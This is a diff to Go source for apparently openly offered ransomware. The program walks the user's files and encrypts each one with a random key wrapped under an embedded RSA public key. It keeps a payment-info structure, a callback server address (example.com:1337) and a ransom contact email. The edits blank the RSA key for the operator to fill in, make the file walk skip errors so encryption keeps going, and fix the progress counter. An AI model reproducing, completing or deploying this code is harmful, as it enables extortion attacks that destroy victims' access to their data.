@@ -34,7 +34,7 @@ var Key rsa.PublicKey
 
 func init() {
 	Key = rsa.PublicKey{
-		N: fromBase10("26813578530985654902945536004162652196181891696705616368489217231832719107178171184637007640539612366358242413637320017272468945068480550352078077546799623750147897670718962085396318728008493834109401984948667155315534935203142433023298250979664020670702906771281314795880320567396089817688698345830614959603791006522060003353718434118908320028628849126222758475667341668882631997550451066312008378159917890844790435917249434007494707318518844049782436260451802782044631197952381833373106718801839594554312934486741105815681151810050947757663592446141123725404273355256546814368135486887315872338046012640600133935733"), // modify this
+		N: fromBase10(""), // modify this
 		E: 65537,
 	}
 }
@@ -42,7 +42,7 @@ func init() {
 func visit(files *[]string) filepath.WalkFunc {
 	return func(path string, info os.FileInfo, err error) error {
 		if err != nil {
-			log.Fatal(err)
+			return nil
 		}
 		if info.IsDir() {
 			return nil
@@ -105,12 +105,12 @@ type PaymentInfo struct {
 	Amount  string
 }
 
-var server string = "192.168.0.111:1337" // server address
-var contact string = "keksec@kek.hq"     // whatever address suits you
+var server string = "example.com:1337" // server address
+var contact string = "keksec@kek.hq"   // whatever address suits you
 
 func main() {
 	var files []string
-	var counter int = 1
+	var counter int = 0
 	var home string
 
 	randomKey := NewEncryptionKey()
@@ -129,6 +129,7 @@ func main() {
 		panic(err)
 	}
 	for _, file := range files {
+		counter++
 		fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)
 
 		data, err := ioutil.ReadFile(file)
@@ -146,7 +147,6 @@ func main() {
 		if err != nil {
 			continue
 		}
-		counter++
 	}
 	fmt.Printf("\n%d files encrypted.\n", len(files))
 
